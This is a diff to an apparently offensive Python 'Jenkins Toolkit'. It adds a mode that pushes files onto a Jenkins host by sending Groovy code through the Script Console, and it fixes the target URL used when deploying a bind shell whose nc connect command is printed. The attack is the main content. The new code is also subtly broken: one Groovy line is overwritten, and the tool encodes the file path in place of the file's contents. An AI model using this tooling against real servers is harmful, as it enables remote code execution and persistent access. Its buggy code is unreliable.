@@ -143,6 +143,18 @@ def GetJenkinsCrumb(url):
 
     return crumb
 
+def GenerateGroovyPushFile(file):
+    "Generated the GroovyScript for File Upload/Push"
+
+    payload_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
+    payload_script='def encoded = "{0}"\n'.format(file)
+    payload_script +='byte[] decoded = encoded.decodeBase64()\n'
+    payload_script +='def s = new String(decoded)\n'
+    payload_script +='new File("/tmp/","file01.pushed").withWriter{ it << s }\n'
+
+    return payload_script
+    
+
 def GenerateGroovyLinuxPayload(payload):
     "Generates the GroovyScript Shell Payload for Linux Systems"
 
@@ -198,7 +210,7 @@ def WriteJenkinsInfo(url,text,file):
 parser = argparse.ArgumentParser(description='Jenkins Toolkit')
 
 parser.add_argument('-u','--url', nargs='+', help='<Required> One or more Jenkins Urls to process. You can also specifiy a text file with the urls in it', required=True, type=str)
-parser.add_argument("-m", "--mode", type=str, choices=['info','shell'], help='<Required> Specifies the Toolkit Mode')
+parser.add_argument("-m", "--mode", type=str, choices=['info','shell','pushfile'], help='<Required> Specifies the Toolkit Mode\n Info: Gather Infos of Jenkins Host via Script Console\nShell: Deloys a bind Shell on the Jenkins Host\nPushFile:Pushes a file to the Jenkins Host\n')
 parser.add_argument("-v", "--verbose", help="Show Debug Information",action="store_true")
 
 _pgroup_mode_shell = parser.add_argument_group("Toolkit Mode: Shell")
@@ -210,6 +222,10 @@ _pgroup_mode_shell.add_argument("-st", "--shelltype", type=str, choices=['perl',
 _pgroup_mode_info = parser.add_argument_group("Toolkit Mode: Info")
 
 _pgroup_mode_info.add_argument('-o','--output', help='<Optional> File where the output is written', type=str, default=None)
+
+_pgroup_mode_pushfile = parser.add_argument_group("Toolkit Mode: Pushfile")
+_pgroup_mode_pushfile.add_argument('-f','--file', help='<Required> File to push to Jenkins Host', type=str, default=None)
+
 
 args = parser.parse_args()
 
@@ -275,6 +291,23 @@ if args.mode == 'info':
     if args.verbose:
         print "Jenkins Info Script imported!"
 
+if args.mode == 'pushfile':
+    
+    _filepush_path = args.file
+    
+    if not os.path.exists(_filepush_path):
+        raise Exception("The file %s does not exist!" % _filepush_path)
+    
+    print "Reading File to Push {0}".format(_filepush_path)
+
+    with open(_filepush_path, 'r') as f:
+        _file_push = f.read()
+        f.closed
+    True
+
+    _file_push = base64.b64encode(_filepush_path)
+
+    
 
 if args.mode == 'shell':
 
@@ -373,6 +406,23 @@ for jenkinsurl in url_list:
 
           if not args.output==None:
               WriteJenkinsInfo(jenkinsurl,"{0} failed!".format(jenkinsurl),args.output)
+
+    if args.mode == "pushfile":
+
+        if system_type=="windows":
+            print(Fore.YELLOW + "Sorry...not yet implemented")
+        else:
+
+            print "Pushing File...."
+            
+            payload_result=SendGroovyScriptScript(jenkinsurl,crumb,GenerateGroovyPushFile(_file_push))
+
+            if payload_result:
+                print(Fore.GREEN + "File {0} successfully pushed to Host {1}".format(_filepush_path,jenkinsurl))
+                print(Style.RESET_ALL)
+            else:
+                print(Fore.RED + "Failed to push File {0} to Host {1}".format(_filepush_path,jenkinsurl))
+                print(Style.RESET_ALL)
           
     if args.mode == 'shell':
 
@@ -383,10 +433,10 @@ for jenkinsurl in url_list:
 
         else:
 
-            payload_result=SendGroovyScriptScript(url,crumb,GenerateGroovyLinuxPayload(shell_script_linux))
+            payload_result=SendGroovyScriptScript(jenkinsurl,crumb,GenerateGroovyLinuxPayload(shell_script_linux))
             
             if payload_result:
-                payload_result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript("{0} /tmp/httpd_payload".format(args.shelltype),False))
+                payload_result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript("{0} /tmp/httpd_payload".format(args.shelltype),False))
                 if payload_result:
                     print(Fore.GREEN + "Shell successfully deployed on Host {0}".format(jenkinsurl))
                     print("Connect to Shell manual via: nc {0} {1} with Password {2}".format(urlparse.hostname,args.shellport,args.shellpassword))
